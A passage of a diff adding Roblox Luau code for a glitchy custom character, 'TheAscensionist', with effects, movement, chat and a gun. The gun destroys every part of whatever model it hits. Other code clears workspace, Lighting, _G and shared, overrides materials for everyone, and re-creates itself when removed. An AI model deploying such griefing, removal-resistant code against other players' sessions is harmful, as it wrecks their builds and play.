+			if (tick()-LastRefresh)>=Time then
+				LastRefresh=tick()
+				Object_1.Refit()
+			end
+		end)
+		return(function()--ManualRefresh
+			LastRefresh=tick()
+			Object_1.Refit()
+		end)
+	end
+	naeeym2.ExtentsOffset=Vector3.new(0, 0, 0)
+	naeeym2.ExtentsOffsetWorldSpace=Vector3.new(0, 0, 0)
+	if game:GetAttribute("MaterialSystemLoaded") then ML=true; end
+	if not ML then
+		FakeCurrentMaterial=Instance.new("MaterialVariant")FakeCurrentMaterial=Instance.new("MaterialVariant")
+		Resume(function()
+			while true do
+				local CurrentMaterial=FakeCurrentMaterial
+				local Success, _=pcall(YieldForTween, TweenService:Create(CurrentMaterial, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {StudsPerTile=10}))
+				if Success then
+					local Success, _=pcall(YieldForTween, TweenService:Create(CurrentMaterial, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {StudsPerTile=0.3}))
+				else
+					RunService.Heartbeat:Wait()
+				end
+			end
+		end)
+		RunService.Heartbeat:Connect(function()
+			Material_1.StudsPerTile=FakeCurrentMaterial.StudsPerTile
+			game:SetAttribute("MaterialSystemLoaded", RandomString())
+		end)
+	end
+	game:SetAttribute("MaterialSystemLoaded", true)
+	r=RefreshInstance(Main, 330.001)
+	local function RandomProperties(Instance_)
+		Instance_.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+		Instance_.Reflectance = math.random(-1e6, 1e6)
+		Instance_.RootPriority = math.random(-127, 127)
+		Instance_.CollisionGroupId = math.random(0, 31)
+		Instance_.Locked=math.random(1, 2)==1
+		Instance_.Archivable=true
+		Instance_.Massless=math.random(1, 2)==1
+		Instance_.Locked=math.random(1, 2)==1
+		Instance_.CastShadow=false
+		local Check=math.random(1, 3)
+		local Ran=(Check==1 and 1e6) or 0
+		Instance_.AssemblyLinearVelocity=Vector3.new((((Check==1 and math.random(-Ran, Ran)) or Check==2 and math.random()) or Check==3 and -math.random()), (((Check==1 and math.random(-Ran, Ran)) or Check==2 and math.random()) or Check==3 and -math.random()), (((Check==1 and math.random(-Ran, Ran)) or Check==2 and math.random()) or Check==3 and -math.random()))
+		Instance_.AssemblyAngularVelocity=Vector3.new(0, 0, 0)
+	end
+
+	local LastReset_=tick()
+	CanAdornee={workspace}
+	Character.Main.Refitted:Connect(function(Object)
+		LastReset=tick()
+		for _, v in pairs(Character) do
+			if v:IsA("BasePart") then
+				v.MaterialVariant=CurrentMaterial
+			end
+		end
+	end)
+	function RandomName(...)
+		for _, v in ipairs({...}) do
+			pcall(function()
+				if type(v)=="table" then
+					for _, v in ipairs(v) do
+						RandomName(v)
+					end
+				elseif typeof(v)=="Instance" then
+					WWWWW(v)
+				end
+			end)
+		end
+	end
+	function AcceptedRayRequirements(Ray)
+		return Ray~=nil
+	end
+	function CalculateStand(StandingPosition)
+		local Returned=table.pack(pcall(function()
+			local Rays={}
+			for i=-1, 1, 1 do
+				for i_=-0.5, 0.5, 0.5 do
+					Insert(Rays, Raycast(StandingPosition*CFrame.new(i, 0, i_).Position, Vector3.new(0, -9e9, 0)))
+				end
+			end
+			return GetClosest(StandingPosition, Rays)
+		end))
+		table.remove(Returned, 1)
+		return table.unpack(Returned)
+	end
+	function CalculateCeiling(StandingPosition)
+		local Returned=table.pack(pcall(function()
+			local Rays={}
+			for i=-1, 1, 1 do
+				for i_=-0.5, 0.5, 0.5 do
+					Insert(Rays, Raycast(StandingPosition*CFrame.new(i, 0, i_).Position, Vector3.new(0, 90, 0)))
+				end
+			end
+			return GetClosest(StandingPosition, Rays)
+		end))
+		table.remove(Returned, 1)
+		return table.unpack(Returned)
+	end
+	Messages, MessageAdded={}, Instance.new("BindableEvent")
+	local FakeMovement=Instance.new("Part")
+	MentallyDisable(FakeMovement)
+	local Changed
+	OriginalSizes={}
+	LastCFrames={}
+	Moving=Instance.new("BindableEvent")
+	local function MoveCharacter(X, Z)
+		pcall(function()
+			Movement.PotentialCFrame=Movement.PotentialCFrame*CFrame.new(X, 0, Z)
+		end)
+	end
+	function TrailSingle(v, Time, Data, Data2)
+		local IsGun=false
+		if LowQuality then return; end
+		if tostring(v)=="Gun" then
+			v=Clone(Backups.Gun, nil, {CFrame=Character.Gun.CFrame})
+			IsGun=true
+		end
+		if IsGun then
+			if v:IsA("BasePart") then
+				local Time=(ValidNumber(tonumber(Time)) and tonumber(Time)) or 0.05
+				local Track=Clone((type(v)=="table" and v.Object) or v, PickRandom({workspace.Terrain}), (Data2~=nil and Data2) or {Transparency=0.75, CastShadow=false, Name=RandomString(), Color=Color3.new(0.1, 0.1, 0.1)})
+				Resume(function()
+					Track:ClearAllChildren()
+					YieldForTween(game:GetService("TweenService"):Create(Track, TweenInfo.new(tonumber(Time), 0), (Data~=nil and Data) or {Transparency=1}))
+					DDD(Track)
+				end)
+				return Track
+			end
+		else
+			if Players.LocalPlayer.UserId==UserId and CameraInfo.Zoom==0 then return; end
+			if v:IsA("BasePart") then
+				local Time=(ValidNumber(tonumber(Time)) and tonumber(Time)) or 0.05
+				local Track=Clone((type(v)=="table" and v.Object) or v , PickRandom({workspace.Terrain}), (Data2~=nil and Data2) or {Transparency=0.75, CastShadow=false, Name=RandomString(), Color=Color3.new(0.1, 0.1, 0.1)})
+				Resume(function()
+					Track:ClearAllChildren()
+					YieldForTween(game:GetService("TweenService"):Create(Track, TweenInfo.new(tonumber(Time), 0), (Data~=nil and Data) or {Transparency=1}))
+					DDD(Track)
+				end)
+				return Track
+			end
+		end
+	end
+	function TrailMultiple(...)
+		local Data={...}
+		Resume(function()
+			for _, v in ipairs(Data) do
+				if (type(v)=="table" and not v.Object) then
+					for _, x in pairs(v) do
+						TrailMultiple(x)
+					end
+				else
+					TrailSingle(v)
+				end
+			end
+		end)
+
+	end
+	function TrailAll()
+		TrailMultiple(Character)
+	end
+	local Settings=UserSettings():GetService("UserGameSettings")
+	Levels=Enum.QualityLevel:GetEnumItems()
+	Quality={}
+	for _, v in pairs(Levels) do
+		Insert(Quality, v)
+	end
+	table.remove(Quality, 1)
+	Insert(Quality, Enum.QualityLevel.Automatic)
+	function Qual(Level)
+		return Quality[Level]
+	end
+	SavedQuality, LowQuality=nil, false
+	RunService.RenderStepped:Connect(function()
+		if IsUser then
+			SavedQuality=Settings.SavedQualityLevel.Value
+			LowQuality=(SavedQuality==Qual(1).Value) or false
+		else
+			SavedQuality, LowQuality=Enum.QualityLevel.Level21.Value, false
+		end
+	end)
+	function Emit(Emitter, Amount)
+		local a=tonumber(Amount)
+		if IsUser then
+			if LowQuality then
+				a=0
+			else
+				if (SavedQuality>=Qual(2).Value and SavedQuality<3) then
+					if Emitter==Character.Eye then
+						return Emitter:Emit(a)
+					end
+				end
+				if (SavedQuality>=Qual(3).Value) then
+					if Emitter==Character.Eye or Emitter==Character.Portal then
+						return Emitter:Emit(a)
+					end
+				end
+			end
+		else
+			return Emitter:Emit(a)
+		end
+	end
+	Glitches={}
+	LastEmit=tick()
+	Character.Text.ZIndexBehaviour=Enum.ZIndexBehavior.Global
+	Character.Text.SizeOffset=Vector3.new(0, 0, 0)
+	Character.Text.StudsOffset=Vector3.new(0, 0, 0)
+	FakePortal, FakeEye, FakeLight, FakeLight2=Instance.new("ParticleEmitter"), Instance.new("ParticleEmitter"), Instance.new(Character.Light.ClassName), Instance.new(Character.EyeLight.ClassName)
+	Resume(function()
+		while true do
+			local Tween=TweenInfo.new(10, 0)
+			TweenService:Create(FakePortal, Tween, {Brightness=30}):Play()
+			TweenService:Create(FakeEye, Tween, {Brightness=30}):Play()
+			TweenService:Create(FakeLight2, Tween, {Brightness=45, Range=24}):Play()
+
+			YieldForTween(TweenService:Create(FakeLight, Tween, {Brightness=25, Range=6}))
+
+			TweenService:Create(FakePortal, Tween, {Brightness=1}):Play()
+			TweenService:Create(FakeEye, Tween, {Brightness=1}):Play()
+			TweenService:Create(FakeLight2, Tween, {Brightness=35, Range=18}):Play()
+
+			YieldForTween(TweenService:Create(FakeLight, Tween, {Brightness=40, Range=4}))
+		end
+	end)
+	FakeLight.Changed:Connect(function(c)
+		if LowQuality then
+			Character.Light.Brightness, Character.Light.Range=0, 0
+		else
+			Character.Light.Brightness, Character.Light.Range=FakeLight.Brightness, FakeLight.Range
+			Character.Light[c]=FakeLight[c]
+		end
+	end)
+	FakeLight2.Changed:Connect(function(c)
+		if LowQuality then
+			Character.EyeLight.Brightness, Character.EyeLight.Range=0, 0
+		else
+			Character.EyeLight.Brightness, Character.EyeLight.Range=FakeLight2.Brightness, FakeLight2.Range
+			Character.EyeLight[c]=FakeLight2[c]
+		end
+	end)
+	RunService.RenderStepped:Connect(function()
+		r()
+		Character.Portal.Brightness=FakePortal.Brightness
+		Character.EyeLight.Color=(RGB and HSV(5)) or DefaultColor
+		Character.Eye.Brightness=FakeEye.Brightness
+		Character.Main.Parent=PickRandom({workspace, workspace.Terrain})
+		if Movement.Walking then
+			Moving:Fire()
+		end
+		for i, v in pairs(Character) do
+			pcall(function()
+				if v:IsA("BasePart") then
+					TrailSingle(i, 0.3, {Transparency=0.95})
+				end
+			end)
+		end
+		pcall(function()
+			for _, v in pairs(Character) do
+				if v:IsA("BasePart") then
+					RandomProperties(v)
+				end
+			end
+			for _, v in pairs(Backups) do
+				pcall(function()
+					if v:IsA("BasePart") then
+						v.CFrame=Movement.CFrame
+					end
+				end)
+			end
+
+			if Scary_1==1 then
+				pcall(function()
+					local Col=math.random(1, 2)
+					local Track=Insert(Glitches, TrailSingle(Head, 0.05, {Transparency=0, Color=Color3.new((Col==1 and 1) or 0, 0, 0)}, {}))
+					local AC; AC=Track.AncestryChanged:Connect(function()
+						Remove(Glitches, Track)
+						return Disconnect(AC)
+					end)
+				end)
+			end
+			if (#Glitches)<=0 then
+				Character.Head.Transparency=0
+			else
+				Character.Head.Transparency=1
+			end
+			for _, Track in pairs(Glitches) do
+				local NeckC0=Welds.Neck.C0
+				local cf={C0=NeckC0*CFrame.Angles(math.rad(-45), math.rad(0), math.rad(math.random(-30, 30))), C1=Welds.Neck.C1}
+				local Eye=Clone(Character.EyeHolder, workspace.Terrain)
+				local Eyep=Clone(Character.Eye, Eye)
+				Track.CFrame=Weldify(cf, Character.Torso)
+				Eye.Position=Track.CFrame*CFrame.new(0, 0, -0.6).Position
+				Emit(Eyep, 1)
+				Debris:AddItem(Eye, 0.06)
+			end
+			pcall(Disconnect, Changed)
+			if Container then
+				Changed=Container.AttributeChanged:Connect(function(i, v)
+					local i_=i:gsub(Player.."_", "") 
+					if (i~="SidewaysMovement" and i~="ForwardMovement" and i~="MoveDirection") and v~=nil and i~=nil then
+						env[i_]=v
+						env[i_:lower()]=v
+						env[i_:upper()]=v
+					end
+				end)
+			end
+			for i, v in pairs(Container:GetAttributes()) do
+				local i_=i:gsub(Player.."_", "") 
+				if (i~="SidewaysMovement" and i~="ForwardMovement" and i~="MoveDirection") and v~=nil and i~=nil then
+					env[i_]=v
+					env[i_:lower()]=v
+					env[i_:upper()]=v
+				end
+			end
+
+			if Scary_1==1 then
+				CurrentMaterial=getfenv()[Random_423].Name
+			else
+				CurrentMaterial=Material_1.Name
+			end
+			for _, v in pairs(Character) do
+				if v:IsA("BasePart") then
+					v.MaterialVariant=CurrentMaterial
+				end
+			end
+			if not EnumTable then EnumTable={}; end
+			if RuinMaterials then
+				for n, v in pairs(Backups) do	
+					if v:IsA("MaterialVariant") then
+						for i, e in pairs(Enum.Material:GetEnumItems()) do
+							if tostring(e)==n then
+								if not EnumTable[e] then
+									local Material=Insert(Materials, ProtectedInstance(tostring(e), {Parent=MaterialService}, {[Identifier]=true}))
+									EnumTable[e]=Material
+								end
+							end
+						end
+					end
+				end
+			end
+			if RuinMaterials then
+				for e, m in pairs(EnumTable) do
+					pcall(MaterialService.SetBaseMaterialOverride, MaterialService, e, m.Name)
+				end
+			else
+				MaterialService:SetBaseMaterialOverride(Enum.Material.DiamondPlate, CurrentMaterial)
+			end
+			if Exists(Container) then
+				BaseSine=workspace:GetServerTimeNow()*tonumber(BaseSineSpeed)
+				Movement.WalkSpeed=tonumber(WalkSpeed)
+				Movement.HipHeight=tonumber(HipHeight)
+			else
+				BaseSine=workspace:GetServerTimeNow()*60
+				Movement.WalkSpeed=15
+				Movement.HipHeight=4.5
+			end
+			SINE, Sine, sine=BaseSine, BaseSine, BaseSine
+			for i, v in pairs(Character) do
+				if v:IsA("BasePart") then
+					if not OriginalSizes[i] then
+						OriginalSizes[i]=v.Size
+					end
+					local Div=math.random(75, 100000)
+					v.Size=OriginalSizes[i]+Vector3.new(math.random()/tonumber(Div), math.random()/tonumber(Div), math.random()/tonumber(Div))
+					v.Color=Color3.fromRGB(64, 64, 64)
+				end
+			end
+			CheckDescendants(Character.Main, 10)
+			CheckDescendants(Character.EyeHolder, 1)
+			CheckDescendants(Character.PortalHolder, 2)
+			for _, v in pairs(workspace.Terrain:GetDescendants()) do
+				if v:IsA("BodyVelocity") or v:IsA("BodyPosition") then
+					FakeDestroy(workspace, {v.Parent})
+				end
+			end
+			tecks2.Font=PickRandom(Fonts)
+			Character.Eye:Clear()
+			if (tick()-LastEmit)>=0.15 then
+				LastEmit=tick()
+				Emit(Character.Portal, 0.5)
+			end
+			if Random_1==1 then
+				Emit(Character.Portal, Random_2)
+			end
+			Emit(Character.Eye, 1)
+			pcall(function()
+				if not Chatting then
+					if RGB then
+						if Scary_1==1 then
+							tecks2.Text=Random_69.." Truss Man "..string.reverse(Random_69)
+						else
+							tecks2.Text="TheAscensionist"
+						end
+						tecks2.TextColor3=HSV(3)
+						Character.Eye.Color=ColorSequence.new(HSV(1))
+						Character.Portal.Color=ColorSequence.new(HSV(3))
+						Character.Light.Color=HSV(3)
+					else
+						if Scary_1==1 then
+							tecks2.Text=Random_69.." Truss Man "..string.reverse(Random_69)
+							if RGB then
+								tecks2.TextColor3=HSV(3)
+								Character.Eye.Color=ColorSequence.new(HSV(1))
+								Character.Portal.Color=ColorSequence.new(HSV(3))
+								Character.Light.Color=HSV(3)
+							else
+								tecks2.TextColor3=Color3.new(1, 0, 0)
+								Character.Eye.Color=ColorSequence.new(Color3.new(1, 0, 0))
+								Character.Portal.Color=ColorSequence.new(Color3.new(1, 0, 0))
+								Character.Light.Color=Color3.new(1, 0, 0)
+							end
+						else
+							if RGB then
+								tecks2.TextColor3=HSV(3)
+								Character.Eye.Color=ColorSequence.new(HSV(1))
+								Character.Portal.Color=ColorSequence.new(HSV(3))
+								Character.Light.Color=HSV(3)
+							else
+								local Speed=0.1
+								Character.Light.Color=Clerp(Character.Light.Color, DefaultColor, Speed, Throttle)
+								local Col=Character.Light.Color
+								local DefaultColor=ColorSequence.new(Col)
+								Character.Eye.Color=DefaultColor
+								Character.Portal.Color=DefaultColor
+								tecks2.Text="The Ascensionist"
+								tecks2.TextColor3=Clerp(tecks2.TextColor3, Color3.fromRGB(50, 50, 50), Speed, Throttle)
+								tecks2.Position=UDim2.new(math.random(-0.4, 0.4), math.random(-5, 5), 0.05, math.random(-5, 5))
+							end
+						end
+					end
+				else
+					tecks2.Text=LastMessage
+					if RGB then
+						tecks2.TextColor3=Clerp(tecks2.TextColor3, HSV(1), 0.1, Throttle)
+					else
+						tecks2.TextColor3=Clerp(tecks2.TextColor3, DefaultColor, 0.1, Throttle)
+					end
+				end
+			end)
+			Character.Text.Rotation=math.random(-2, 2)
+			Clean(sp)
+			if Exists(Remote) then
+				Insert(sp, Remote.OnClientEvent:Connect(function(Object, Tween)
+					if Object=="Mouse" then
+						local Mouse=Tween
+						local Time=1
+						local Hit = Mouse.Hit.Position
+						local Hole=(Gun.CFrame*CFrame.new(0, 0.4, -1.1)).Position
+						local Ray_=Raycast(Hole, CFrame.new(Hole, Hit).LookVector*((Hole-Hit).Magnitude+3))
+						if Ray_ and Ray_.Instance then
+							local MaxParent, Connections_ = Ray_.Instance, {}
+							while MaxParent.Parent ~= workspace and MaxParent.Parent ~= workspace.Terrain do
+								MaxParent = MaxParent.Parent
+							end
+							local Center
+							if MaxParent:IsA("Model") or MaxParent:IsA("WorldModel") then
+								Center=MaxParent:GetBoundingBox()
+							end
+							for _, v in pairs(MaxParent:GetDescendants()) do
+								if v:IsA("BasePart") then
+									Kill(v, false, Center)
+								end
+							end
+							if MaxParent:IsA("BasePart") then
+								Kill(MaxParent, false, Center)
+							end
+							table.insert(Connections_, MaxParent.DescendantAdded:Connect(function(v)
+								if v:IsA("BasePart") then
+									Kill(v, true)
+								end
+							end))
+							table.insert(Connections_, MaxParent.AncestryChanged:Connect(function()
+								if not MaxParent:IsDescendantOf(workspace) then
+									for _, v in pairs(Connections_) do
+										v:Disconnect()
+									end
+								end
+							end))
+						end
+						local Color=Color3.new(1, 1, 0)
+						if DefaultColor~=Color3.new(1, 1, 1) then
+							Color=DefaultColor
+						end
+						local EffectsHolder
+						local Refit
+						function Refit()
+							local Cons={}
+							local Done=false
+							local Current=RandomInstance()
+							local EffectsHolder=(Backups[Current]~=nil and Instance_(Backups[Current])) or Instance_(Current)
+							EffectsHolder.Name=RandomString()
+							EffectsHolder.Parent=workspace
+							EffectsHolder:SetAttribute(RefitAtt, RandomString())
+							Insert(Cons, EffectsHolder.AncestryChanged:Connect(function()
+								if Done then return; end
+								if EffectsHolder.Parent~=workspace.Terrain then
+									DDD(EffectsHolder)
+									Refit()
+								end
+							end))
+							Insert(Cons, EffectsHolder.DescendantRemoving:Connect(function()
+								if Done then return; end
+								Done=true
+								DDD(EffectsHolder)
+								Refit()
+							end))
+							Resume(function()
+								local Ray_ = {Position = Ray_ and Ray_.Position or Hit}
+								local EffectHolder = Instance.new("Part", nil, {CFrame = CFrame.new(Hole, Ray_.Position)})
+								EffectHolder.Color, EffectHolder.Material = Color, 288
+								local Effect = Instance.new("BlockMesh", EffectHolder, {Offset = Vector3.new(0, 0, -(Hole-Ray_.Position).Magnitude/2), Scale = Vector3.new(0.5/EffectHolder.Size.X, 0.5/EffectHolder.Size.Y, (Hole-Ray_.Position).Magnitude/EffectHolder.Size.Z)})
+								Effectify{EffectHolder}								
+								EffectHolder.Parent = EffectsHolder
+								local EffectHolder_ = Instance.new("Part", nil, {CFrame = CFrame.new(Hole)})
+								EffectHolder_.Color, EffectHolder_.Material = Color, 288
+								local Effect_ = Instance.new("BlockMesh", EffectHolder_, {Scale = Vector3.new(0.75/EffectHolder_.Size.X, 0.75/EffectHolder_.Size.Y, 0.75/EffectHolder_.Size.Z)})
+								Effectify{EffectHolder_}
+								EffectHolder_.Parent = EffectsHolder
+								TweenService:Create(EffectHolder, TweenInfo.new(Time, 0), {Transparency = 1}):Play()
+								TweenService:Create(EffectHolder_, TweenInfo.new(Time, 0), {Transparency = 1,Rotation = Vector3.new(999+math.random(1,360),999+math.random(1,360),999+math.random(1,360))}):Play()
+								TweenService:Create(Effect, TweenInfo.new(Time, 0), {Scale = Vector3.new(0,0,(Hole-Ray_.Position).Magnitude/EffectHolder.Size.Z)}):Play()
+								YieldForTween(TweenService:Create(Effect_, TweenInfo.new(Time, 0), {Scale = Vector3.new(1.25/EffectHolder_.Size.X,1.25/EffectHolder_.Size.Y,1.25/EffectHolder_.Size.Z)}))
+								Clean(Cons)
+								Done=true
+								DDD(Effect)
+								DDD(EffectHolder)
+								DDD(EffectsHolder)
+							end)
+						end
+						Refit()
+					end
+				end))
+			end
+			if Exists(Container) then
+				Insert(sp, Container.AttributeChanged:Connect(function(Type)
+					if Type=="Clear" then
+						ClearInstances(workspace, Lighting)
+					end
+				end))
+			end
+			if not Messages_ then Messages_={}; end
+			if Exists(MessageContainer) then
+				for i, v in pairs(MessageContainer:GetAttributes()) do
+					if (type(tonumber(i))~="number") then
+						MessageContainer:SetAttribute(tostring(i), nil)
+					end
+				end
+				Insert(sp, MessageContainer.AttributeChanged:Connect(function(Index)
+					local Tween=MessageContainer:GetAttribute(tostring(Index))
+					if string.match(Tween, "/e") then return; end
+					Resume(function()
+						local msg=Tween
+						local function say(u: string, msg: string)
+							local DefaultColor=DefaultColor
+							if RGB then DefaultColor=HSV(4); end
+							local Hex=([[<font color='#DefaultColor'>%s<font color='#DefaultColor'>%s</font>: %s</font>]]):gsub("DefaultColor", tostring(DefaultColor:ToHex()))
+							ChatSystem:DisplaySystemMessage(string.format(Hex, u ~= "" or "", "TheAscensionist", (msg)))
+						end
+						say("", msg)
+						StarterGui:SetCore("ChatMakeSystemMessage", {
+							Text = "TheAscensionist"..": "..(msg),
+							Color = DefaultColor,
+							FontSize = Enum.FontSize.Size24, })
+					end)
+				end))
+			end
+			PlayerGui=Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
+			if PlayerGui then
+				Insert(sp, PlayerGui.Changed:Connect(function(Property)
+					if Property=="Name" then
+						PlayerGui.Name="PlayerGui"
+					end
+				end))
+			end
+			Clean(c)
+			for _, v in pairs(PlayerGui:GetDescendants()) do
+				if v:IsA("WorldModel") then
+					FakeDestroy(v, v:GetDescendants())
+				end
+			end
+			for _, x in pairs(Effects) do
+				if x:GetAttribute("Effected") then
+					if RGB then
+						x.Color=HSV(4)
+					else
+						if DefaultColor~=Color3.new(1, 1, 1) then
+							x.Color=DefaultColor
+						end
+					end
+				end
+			end
+		--[[for _, v in pairs(workspace:GetChildren()) do
+			CheckFor(v)
+		end]]
+			for _, v in pairs(Texts) do
+				pcall(function()
+					v.Text=ReplaceName(v.Text)
+					pcall(function()
+						v.PlaceholderText=ReplaceName(v.PlaceholderText)
+					end)
+				end)
+			end
+			pcall(table.clear, _G)
+			pcall(table.clear, shared)
+			for i, v in pairs(oldrgbpr) do
+				Lighting[i]=v
+			end
+		end)
+	end)
+	EffectTable={}
+	local Fonts = {
+		Enum.Font.Antique,
+		Enum.Font.Arcade,
+		Enum.Font.Arial,
+		Enum.Font.ArialBold,
+		Enum.Font.Bodoni,
+		Enum.Font.Cartoon,
+		Enum.Font.Code,
+		Enum.Font.Jura,
+		Enum.Font.JosefinSans,
+		Enum.Font.Kalam,
+		Enum.Font.Fantasy,
+		Enum.Font.Garamond,
+		Enum.Font.Highway,
+		Enum.Font.Legacy,
+		Enum.Font.Merriweather,
+		Enum.Font.Michroma,
+		Enum.Font.Nunito,
+		Enum.Font.Oswald,
+		Enum.Font.PermanentMarker,
+		Enum.Font.Sarpanch,
+		Enum.Font.SciFi,
+		Enum.Font.SourceSans,
+		Enum.Font.SourceSansBold,
+		Enum.Font.SourceSansItalic,
+		Enum.Font.SourceSansLight,
+		Enum.Font.SourceSansSemibold,
+		Enum.Font.Ubuntu
+	}
+	local function Nan()
+		return (math.random(1, 2)==1 and 0/0) or -(0/0)
+	end
+	local function rrr()
+		return math.random(-1000, 1000)
+	end
+	local function Clerp2(a, ...)
+		return a:Lerp(...)
+	end
+	Movement.PotentialCFrame=CFrame.new(0, 0, 0)
+	Movement.WalkSpeed=15
+	Movement.HipHeight=4.5
+	RunService.Heartbeat:Connect(function(Frames)
+		ConsecutiveFramesHB+=Frames
+		ThrottleHB=0
+		for _ = 1, ConsecutiveFramesHB/FrameHB do
+			ConsecutiveFramesHB-=FrameHB
+			ThrottleHB+=1
+		end
+		for _, v in ipairs(MaterialService:GetChildren()) do
+			if v.ClassName~="MaterialVariant" then
+				DDD(v)
+			end
+		end
+		Character.Text.LayoutOrder=rrr()
+		Character.Text.ZIndex=rrr()
+		Character.Text.SelectionOrder=rrr()
+		Character.Text.ClipDescendants=tof()
+		Character.Text.AutoLocalize=tof()
+		pcall(function()
+			local Target
+			if IsUser then
+				Target=Movement
+				if not Movement.Flying then
+					local Ray_ = CalculateStand(Movement.CFrame)
+					if Ray_ then
+						if AcceptedRayRequirements(Ray_) then
+							StandingOn = Ray_.Instance
+							local NewCFrame = CleanCFrame(CFrame.new(0, (Ray_.Position.Y-Movement.CFrame.Y)+3+Movement.HipHeight, 0)*Movement.CFrame)
+							if #LastCFrames >= 300 then
+								table.remove(LastCFrames, 1)
+							end
+							table.insert(LastCFrames, NewCFrame)
+							if not Movement.Flying then
+								Movement.CFrame = NewCFrame
+							end
+						end
+					else
+						local Ray_=CalculateCeiling(Movement.CFrame)
+						if Ray_ and Ray_.Instance then
+							if AcceptedRayRequirements(Ray_) then
+								StandingOn = Ray_.Instance
+								local NewCFrame = CleanCFrame(CFrame.new(0, ((Ray_.Position.Y-Movement.CFrame.Y)+3+Movement.HipHeight)+Ray_.Instance.Size.Y, 0)*Movement.CFrame)
+								if #LastCFrames >= 300 then
+									table.remove(LastCFrames, 1)
+								end
+								table.insert(LastCFrames, NewCFrame)
+								if not Movement.Flying then
+									Movement.CFrame = NewCFrame
+								end
+							end
+						else
+							local Ray_=CalculateStand(Movement.CFrame*CFrame.new(0, 5, 0))
+							if Ray_ and Ray_.Instance then
+								if AcceptedRayRequirements(Ray_) then
+									StandingOn = Ray_.Instance
+									local NewCFrame = CleanCFrame(CFrame.new(0, ((Ray_.Position.Y-Movement.CFrame.Y)+3+Movement.HipHeight)*Ray_.Instance.Size.Y/2, 0)*Movement.CFrame)
+									if #LastCFrames >= 300 then
+										table.remove(LastCFrames, 1)
+									end
+									table.insert(LastCFrames, NewCFrame)
+									if not Movement.Flying then
+										Movement.CFrame = NewCFrame
+									end
+								end
+							else
+								if not Movement.Flying then
+									for i = #LastCFrames, 1, -1 do
+										Ray_ = CalculateStand(LastCFrames[i])
+										if Ray_ then
+											if AcceptedRayRequirements(Ray_) then
+												StandingOn = Ray_.Instance
+												local NewCFrame = CleanCFrame(CFrame.new(0, (Ray_.Position.Y-LastCFrames[i].Y)+3+Movement.HipHeight, 0)*LastCFrames[i])
+												if #LastCFrames >= 300 then
+													table.remove(LastCFrames, 1)
+												end
+												table.insert(LastCFrames, NewCFrame)
+												Movement.CFrame = NewCFrame
+												break
+											end
+										else
+											table.remove(LastCFrames, i)
+										end
+									end
+								else
+									local Ray_ = CalculateStand(Movement.CFrame)
+									if Ray_ then
+										if AcceptedRayRequirements(Ray_) then
+											StandingOn = Ray_.Instance
+											local NewCFrame = CleanCFrame(CFrame.new(0, (Ray_.Position.Y-Movement.CFrame.Y)+3+Movement.HipHeight, 0)*Movement.CFrame)
+											if #LastCFrames >= 300 then
+												table.remove(LastCFrames, 1)
+											end
+											table.insert(LastCFrames, NewCFrame)
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+				local OldCFrame=Movement.CFrame
+				if Movement.Flying then
+					Movement.PotentialCFrame=CFrame.new(Movement.CFrame.Position)*CameraInfo.Angles
+				else
+					Movement.PotentialCFrame=CFrame.new(Movement.CFrame.Position)*CFrame.Angles(0, math.rad(CameraInfo.Rotation.X), 0)
+				end
+				Movement.W, Movement.A, Movement.S, Movement.D=KeyDown("W"), KeyDown("A"), KeyDown("S"), KeyDown("D")
+				if Movement.W then
+					MoveCharacter(0, -1)
+				end
+				if Movement.A then
+					MoveCharacter(-1, 0)
+				end
+				if Movement.S then
+					MoveCharacter(0, 1)
+				end
+				if Movement.D then
+					MoveCharacter(1, 0)
+				end
+				if (Movement.PotentialCFrame.Position~=OldCFrame.Position) then
+					Movement.Walking=true
+					local NewCFrame=CFrame.new(0, 0, -1*(Movement.WalkSpeed/60))
+					if Movement.Flying then
+						local d=Movement.PotentialCFrame
+						local dp=d.Position
+						local o=ToOrientation(d)
+						local lv=ToOrientation(CFrame.new(Movement.CFrame.Position, dp))
+						Movement.CFrame=CFrame.new(Movement.CFrame.Position)*CFrame.fromOrientation(lv.X, lv.Y, o.Z)*NewCFrame
+					else
+						Movement.CFrame=CFrame.new(Movement.CFrame.Position, Movement.PotentialCFrame.Position)*NewCFrame
+					end
+					Movement.CFrame=Clerp2(CFrame.new(Movement.CFrame.Position)*(OldCFrame-OldCFrame.Position), Movement.CFrame, 0.1)
+					MoveDirection=CleanCFrame(CFrame.new(OldCFrame.Position, Vector3.new(Movement.CFrame.X, OldCFrame.Y, Movement.CFrame.Z))).LookVector
+					local Look=CFrame.new(Target.CFrame.Position, Target.CFrame.Position+Vector3.new(Target.CFrame.LookVector.X, 0, Target.CFrame.LookVector.Z))
+					ForwardMovement, SidewaysMovement=(Movement.MoveDirection*Look.LookVector).X+(Movement.MoveDirection*Look.LookVector).Z, (Movement.MoveDirection*Look.RightVector).X+(Movement.MoveDirection*Look.RightVector).Z
+					Movement.ForwardMovement, Movement.SidewaysMovement, Movement.MoveDirection=ForwardMovement, SidewaysMovement, MoveDirection
+				else
+					Movement.Walking=false
+					MoveDirection=Vector3.new(0, 0, 0)
+				end
+				Movement.MoveDirection=MoveDirection
+			else
+				for a, v in pairs(Container:GetAttributes()) do
+					Movement[a]=v
+					if string.len(a)>3 then
+						getfenv()[a]=v
+					end
+				end
+				local p, o=MovementPos, MovementOri
+				local NewCFrame=CFrame.new(p)*CFrame.fromOrientation(o.X, o.Y, o.Z)
+				Movement.CFrame=Clerp(Movement.CFrame, NewCFrame, 0.25, ThrottleHB)
+			end
+			if CameraInfo.Zoom==0 then
+				for _, v in pairs(Character) do
+					if v:IsA("BasePart") and v~=Gun then
+						v.Transparency=1
+					end
+				end
+				if Movement.Flying then
+					Movement.CFrame = Clerp(Movement.CFrame, CFrame.new(Movement.CFrame.Position)*CameraInfo.Angles, 0.1, ThrottleHB)
+				else
+					Movement.CFrame = Clerp(Movement.CFrame, CFrame.new(Movement.CFrame.Position)*CFrame.Angles(0, math.rad(CameraInfo.Rotation.X), 0), 0.1, ThrottleHB)
+				end
+			else
+				for _, v in pairs(Character) do
+					if v:IsA("BasePart") then
+						v.Transparency=0
+					end
+				end
+			end
+			for _, v in pairs(Texts) do
+				if string.match(v.Text, "TheAscensionist") then
+					if RGB or DefaultColor==Color3.new(1, 1, 1) then
+						v.TextColor3=Clerp(v.TextColor3, HSV(3), 0.75)
+					else
